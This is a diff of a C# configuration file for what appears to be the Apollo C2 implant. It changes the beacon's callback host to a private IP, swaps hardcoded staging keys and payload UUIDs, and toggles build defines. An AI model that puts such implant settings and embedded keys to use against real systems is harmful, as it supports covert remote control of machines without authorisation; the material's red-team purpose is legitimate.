@@ -1,9 +1,9 @@
 ﻿#define C2PROFILE_NAME_UPPER
 
-#define LOCAL_BUILD
+//#define LOCAL_BUILD
 
 #if LOCAL_BUILD
-#define HTTP
+//#define HTTP
 //#define WEBSOCKET
 //#define TCP
 //#define SMB
@@ -46,7 +46,7 @@ namespace Apollo
                         { "callback_interval", "1" },
                         { "callback_jitter", "0" },
                         { "callback_port", "80" },
-                        { "callback_host", "http://172.29.111.173/" },
+                        { "callback_host", "http://192.168.53.1" },
                         { "post_uri", "data" },
                         { "encrypted_exchange_check", "T" },
                         { "proxy_host", "" },
@@ -153,7 +153,7 @@ namespace Apollo
         public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
 #if LOCAL_BUILD
 #if HTTP
-        public static string StagingRSAPrivateKey = "q4sOxwc6YZe73yHndQFbaGDvPwLZifEVbi2YjkbAaCI=";
+        public static string StagingRSAPrivateKey = "wkskVa0wTi4E3EZ6bi9YyKpbHb01NNDgZ1BXnJJM5io=";
 #elif WEBSOCKET
         public static string StagingRSAPrivateKey = "Hl3IzCYy3io5QU70xjpYyCNrOmA84aWMZLkCwumrAFM=";
 #elif SMB
@@ -162,7 +162,7 @@ namespace Apollo
         public static string StagingRSAPrivateKey = "Zq24zZvWPRGdWwEQ79JXcHunzvcOJaKLH7WtR+gLiGg=";
 #endif
 #if HTTP
-        public static string PayloadUUID = "526518b1-a2fb-4144-981d-ca42b230df0b";
+        public static string PayloadUUID = "b40195db-22e5-4f9f-afc5-2f170c3cc204";
 #elif WEBSOCKET
         public static string PayloadUUID = "7546e204-aae4-42df-b28a-ade1c13594d2";
 #elif SMB
